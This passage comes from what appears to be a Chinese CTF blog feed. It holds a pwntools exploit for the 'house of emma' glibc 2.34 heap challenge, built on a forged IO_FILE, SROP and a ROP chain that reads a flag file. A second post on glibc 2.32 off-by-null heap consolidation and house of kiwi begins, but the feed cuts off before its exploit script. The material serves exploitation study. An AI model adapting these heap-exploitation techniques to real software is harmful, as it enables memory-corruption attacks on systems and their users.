PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard_local)</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> PTR_DEMANGLE(var)     PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure><p>其实异或这一部也就是上面调用的这个函数干的事情。所以如果我们想要劫持程序执行流还必须泄漏这个的话就很麻烦了，所以我们不选择泄漏他的值，我们选择覆盖他的值，后面在往这里写入地址的时候作相应的处理即可。</p><h2 id="题目house-of-emma"><a href="#题目house-of-emma" class="headerlink" title="题目house of emma"></a>题目house of emma</h2><p>题目的逆向过程没什么好说的又不是cpp，所以这里就不再提。</p><p>然后题目存在的漏洞就是free之后没有清空指针导致UAF了。</p><p>其实懂了上面所描述的这道题就很好理解了，直接可以自己做出来了。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, size</span>):</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p8(<span class="number">0x1</span>)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line">    payload += p16(size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p8(<span class="number">0x2</span>)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p8(<span class="number">0x3</span>)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p8(<span class="number">0x4</span>)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(content))</span><br><span class="line">    payload += p16(<span class="built_in">len</span>(content))</span><br><span class="line">    payload += content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p8(<span class="number">0x5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload) &gt; <span class="number">0x500</span>:</span><br><span class="line">        error(<span class="string">&#x27;!!!&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Pls input the opcode&#x27;</span>)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x410</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x410</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x420</span>)</span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x430</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">run()</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">run()</span><br><span class="line">r.recvline()</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1f30b0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">gadget_addr = libc_base + <span class="number">0x146020</span></span><br><span class="line">pointer_chk_guard_local = libc_base + <span class="number">0x234c10</span> + <span class="number">0x2000</span></span><br><span class="line">setcontext_addr = libc_base + <span class="number">0x50bfd</span></span><br><span class="line">pop_rdi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>)))</span><br><span class="line">pop_rsi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi\nret&#x27;</span>)))</span><br><span class="line">pop_rax = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rax\nret&#x27;</span>)))</span><br><span class="line">syscall = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;syscall\nret&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">run()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x2ae0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    flat(libc_base + <span class="number">0x1f30b0</span>, libc_base + <span class="number">0x1f30b0</span>, heap_base + <span class="number">0x2ae0</span>,</span><br><span class="line">         libc_base + libc.symbols[<span class="string">&#x27;stderr&#x27;</span>] - <span class="number">0x20</span>))</span><br><span class="line">create(<span class="number">5</span>, <span class="number">0x430</span>)</span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x410</span>)</span><br><span class="line">run()</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    flat(libc_base + <span class="number">0x1f30b0</span>, libc_base + <span class="number">0x1f30b0</span>, heap_base + <span class="number">0x2ae0</span>,</span><br><span class="line">         pointer_chk_guard_local))</span><br><span class="line">create(<span class="number">6</span>, <span class="number">0x430</span>)</span><br><span class="line">run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    tmp = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp[key:] + tmp[:key], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">7</span>, <span class="number">0x450</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0x430</span>)</span><br><span class="line">run()</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x430</span> + flat(<span class="number">0</span>, <span class="number">0x300</span>))</span><br><span class="line">run()</span><br><span class="line"></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">srop_addr = heap_base + <span class="number">0x2ae0</span> + <span class="number">0x10</span></span><br><span class="line">fake_IO_FILE = <span class="number">2</span> * p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(next_chain)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>] + <span class="number">0x40</span>)</span><br><span class="line">fake_IO_FILE += p64(srop_addr)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + <span class="number">0x22a0</span>), <span class="number">0x11</span>))</span><br><span class="line"></span><br><span class="line">fake_frame_addr = srop_addr</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = fake_frame_addr + <span class="number">0xF8</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0x100</span></span><br><span class="line">frame.rsp = fake_frame_addr + <span class="number">0xF8</span> + <span class="number">0x10</span></span><br><span class="line">frame.rip = pop_rdi + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">rop_data = [</span><br><span class="line">    pop_rax, <span class="number">2</span>, syscall, pop_rax, <span class="number">0</span>, pop_rdi, <span class="number">3</span>, pop_rsi,</span><br><span class="line">    fake_frame_addr + <span class="number">0x200</span>, syscall, pop_rax, <span class="number">1</span>, pop_rdi, <span class="number">1</span>, pop_rsi,</span><br><span class="line">    fake_frame_addr + <span class="number">0x200</span>, syscall</span><br><span class="line">]</span><br><span class="line">pay = p64(<span class="number">0</span>) + p64(fake_frame_addr) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span> + p64(setcontext_addr +</span><br><span class="line">                                                           <span class="number">61</span>)</span><br><span class="line">pay += <span class="built_in">bytes</span>(frame).ljust(<span class="number">0xF8</span>, <span class="string">b&#x27;\x00&#x27;</span>)[<span class="number">0x28</span>:] + <span class="string">b&#x27;flag&#x27;</span>.ljust(</span><br><span class="line">    <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(rop_data)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, pay)</span><br><span class="line">edit(<span class="number">2</span>, fake_IO_FILE)</span><br><span class="line">run()</span><br><span class="line"></span><br><span class="line">create(<span class="number">9</span>, <span class="number">0x450</span>)</span><br><span class="line">run()</span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="反思与总结"><a href="#反思与总结" class="headerlink" title="反思与总结"></a>反思与总结</h3><p>上面exp其实是跑不通的，主要原因就是ld在不同环境的偏移不一致导致的，在我的docker环境中pointer_chk_guard_local指针的地址位于不可写的地方，所以我就随便找到了个地方代替他，就假装修改了。</p><p>这一利用方式中可以看出来大量使用了large bin attack，并且题目的并没有存在可以任意地址写的漏洞，或者说是构造出这样一个漏洞出来，所以这一利用方式的限制条件其实也比较小。</p><hr><p>参考文章：</p><p><a class="link"   href="https://blog.wjhwjhn.com/archives/751/" >https://blog.wjhwjhn.com/archives/751/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在glibc2.34中删除了malloc_hook和free_hook，所以孕育而生了一个新的利用方法house of emma。这篇文章需要两个前置知识&lt;a href=&quot;https://cv196082.gitee.io/2022/02/23/largebin-attac</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house系列" scheme="https://cv196082.gitee.io/tags/house%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>glibc2.32的堆风水+house of kiwi实例</title>
    <link href="https://cv196082.gitee.io/2022/05/13/glibc2-32%E7%9A%84%E5%A0%86%E9%A3%8E%E6%B0%B4-house-of-kiwi%E5%AE%9E%E4%BE%8B/"/>
    <id>https://cv196082.gitee.io/2022/05/13/glibc2-32%E7%9A%84%E5%A0%86%E9%A3%8E%E6%B0%B4-house-of-kiwi%E5%AE%9E%E4%BE%8B/</id>
    <published>2022-05-13T13:12:41.000Z</published>
    <updated>2022-05-13T13:12:11.980Z</updated>
    
    <content type="html"><![CDATA[<p>看我前面的文章可以发现我在做漏洞利用的总结主要是在glibc2.31以下版本的，这也就导致了在后续版本的glibc的利用方式我也没怎么掌握，后续打算将house of kiwi以及house of Emma写完之后会关注一下glibc2.31之后的how2heap的poc，如果存在差异就会写文章记录。</p><p>在学校的一次比赛当中我出了一道题，是glibc2.23版本的，当时的解题关键就是off by null进行多个堆合并，利用方式较为简单。但是就目前的glibc2.32中consolidate的条件是比较苛刻的，因此出现了新的堆风水的方式了(这篇文章也是把以前的坑填了)。</p><h2 id="隔块堆合并手法"><a href="#隔块堆合并手法" class="headerlink" title="隔块堆合并手法"></a>隔块堆合并手法</h2><p>首先还是先看源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里是验证了p位，如果为0那么就检测前一个chunk的size是否等于当前chunk的size，那么就不能单纯的像以前那样利用了，我们还需要伪造前一个chunk的size了，这里需要用到large bin的机制了。</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>既然我们只能进行off by null还需要堆合并，那我们就需要满足上面代码的两项要求，第一就是常规的chunk-&gt;fd-&gt;bk指向本身，其次就是size==prev_size</p><p><img src="/images/image-20220512205902066.png" alt="image-20220512205902066"></p><p>此时取出size:0x510，由于残留指针，所以还是存在以下的指向关系</p><p><img src="/images/image-20220513100743528.png" alt="image-20220513100743528"></p><p>并且此时在fd，bk位置伪造prev_size和size，那么我们在下面off by null的时候计算出prev_size即可绕过对于size的检查了。但是此时又出现了一个问题，fake_chunk的fd的bk以及fake_chunk的bk的fd并不指向它本身。那么现在取出size:0x500的chunk，直接覆盖掉其fd指针，使他指向size:0x510，然后large bin当中只剩下一个size:0x520，它的fd和bk都指向了large bin了，所以我们此时需要再free一个size为0x500的chunk，然后把size:0x520取出来进行覆盖，那么即可绕过consolidate时的验证了。</p><h2 id="NULL-FXCK"><a href="#NULL-FXCK" class="headerlink" title="NULL_FXCK"></a>NULL_FXCK</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><p>这道题同样是菜单题，但是不同的是在每次选择的时候会验证__malloc_hook和__free_hook以及会清除掉tcache的count。</p><p>然后唯一的漏洞点是modify函数，存在一个off by null但是只能执行一次。并且在delete函数会清空指针。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>因为只有一次off by null的机会，所以我们能够利用的方式就是上面的堆合并技巧，但是这里的create函数在写入数据的时候总是会把结尾改为\x00并且最小的chunk为0x110所以我们无法直接覆盖内容了，需要利用partial overwrite并且这里的partial overwrite还需要注意一下。我们需要让size:0x510的chunk的地址形式为：0xAAAAAAAAAAAA00AA</p><p><img src="/images/image-20220513130004125.png" alt="image-20220513130004125"></p><p>形成这样的堆叠，接着申请回来并覆盖值</p><p><img src="/images/image-20220513130252713.png" alt="image-20220513130252713"></p><p>当然这里由于partial overwrite的缘故第一位是否为0是需要一定概率的(上面的0x1000是因为我还没有计算大小，后续会调整)。</p><p><img src="/images/image-20220513130638823.png" alt="image-20220513130638823"></p><p>可以看到这里就实现了consolidate。</p><p>下面就是泄漏地址了，首先先泄漏堆地址，因为泄漏起来较为简单，在我们consolidate之前我们所显示的堆地址都是以\x00结尾导致无法泄漏，但是在consolidate之后存在以下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">unlink_chunk (mstate av, mchunkptr p)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  ... ...</span><br></pre></td></tr></table></figure><p>导致堆地址写在了其他索引的chunk当中，所以可以非常轻松的泄漏出来，不过这里的main_arena+96非常恶心，结尾是\x00有因为是strlen计算大小打印就导致泄漏不出来，但是这里使用的方法可以继续延续在unsorted bin当中的思路进行切割，但是下一步就是申请大chunk将我们consolidate的chunk放到largin bin当中。</p><p>后面也就是实现任意地址写了，首先想到的肯定就是tcache，虽然题目看起来是没有办法对tcache进行攻击的但是tcache这个结构体也只是因为tls结构存放的指针才起的作用，所以我们可以通过large bin attack来修改tls结构当中的指针，然后在堆块中布置好地址，最后修改地址进行fsop。这里采取的方式就是以前写过的<a href="https://cv196082.gitee.io/2022/03/11/house-of-corrosion-husk-kiwi/">house of kiwi</a>不过以前写的比较匆忙也没有加以实践，可能看起来就会晕头晕脑的，所以这里还是从源码层面分析一边接着放出exp应该会好点。</p><h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h3><p>先来说一下为什么不能用house of系列中的其他方式，因为这道题的退出函数是_exit然而其他的要求是exit退出或者正常main退出，所以这里只能寻找其他攻击链。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__malloc_assert (<span class="keyword">const</span> <span class="keyword">char</span> *assertion, <span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> line,</span><br><span class="line"> <span class="keyword">const</span> <span class="keyword">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="keyword">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     file, line,</span><br><span class="line">     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当assert触发时会调用这一函数，中间调用了fflush</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_fflush (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_flush_all ();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> result;</span><br><span class="line">      CHECK_FILE (fp, EOF);</span><br><span class="line">      _IO_acquire_lock (fp);</span><br><span class="line">      result = _IO_SYNC (fp) ? EOF : <span class="number">0</span>;</span><br><span class="line">      _IO_release_lock (fp);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220513173015804.png" alt="image-20220513173015804"></p><p>通过调试也可以看到调用关系</p><p><img src="/images/image-20220513173151430.png" alt="image-20220513173151430"></p><p>并且这里是可读可写的，所以后续就好办了。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 